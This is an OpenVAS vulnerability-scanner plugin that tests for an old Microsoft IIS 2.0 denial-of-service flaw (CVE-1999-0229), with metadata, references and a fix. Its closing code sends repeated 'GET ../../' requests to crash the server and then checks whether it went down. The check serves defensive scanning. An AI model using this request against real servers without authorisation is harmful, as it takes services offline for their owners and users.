###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_ms_iis_get_request_dos_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Microsoft IIS GET Request Denial of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let the remote unauthenticated attackers
  to force the IIS server to become unresponsive until the IIS service
  is restarted manually by the administrator.
  Impact Level: Application";
tag_affected = "Microsoft Internet Information Server 2.0 and prior on Microsoft Windows NT";
tag_insight = "The flaw is due to an error in the handling of HTTP GET requests that
  contain a tunable number of '../' sequences in the URL.";
tag_solution = "Upgrade to latest version of IIS and latest Microsoft Service Packs.
  For updated refer, http://www.microsoft.com/";
tag_summary = "The host is running Microsoft IIS Webserver and is prone to
  denial of service vulnerability.";

if(description)
{
  script_id(902914);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-1999-0229");
  script_bugtraq_id(2218);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-05-22 12:45:33 +0530 (Tue, 22 May 2012)");
  script_name("Microsoft IIS GET Request Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/1638");
  script_xref(name : "URL" , value : "http://en.securitylab.ru/nvd/246425.php");
  script_xref(name : "URL" , value : "http://www.iss.net/security_center/reference/vuln/HTTP_DotDot.htm");

  script_description(desc);
  script_summary("Performs a denial of service against IIS");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2012 SecPod");
  script_family("Web Servers");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

iisPort = "";
banner = "";
res = "";

## Check the default port
iisPort = get_http_port(default:80);
if(!iisPort){
  iisPort = 80;
}

## Check port status
if(!get_port_state(iisPort)){
  exit(0);
}

## Confirm IIS is running through banner
banner = get_http_banner(port: iisPort);
if("Microsoft-IIS" >!< banner){
  exit(0);
}

## Send attack request multiple time
for(i=0; i<3; i++){
  res =  http_send_recv(port: iisPort, data: 'GET ../../\r\n');
}

sleep(3);

## Confirm Microsoft IIS server is dead
if(http_is_dead(port:iisPort) && !res){
  security_warning(iisPort);
}
